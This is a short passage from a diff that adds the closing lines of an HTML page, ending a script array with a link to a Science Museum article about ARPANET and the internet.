+                  link: "https://www.sciencemuseum.org.uk/objects-and-stories/arpanet-internet",
+              },
+          ];
+        </script>
+
+  </body>
+</html>
+
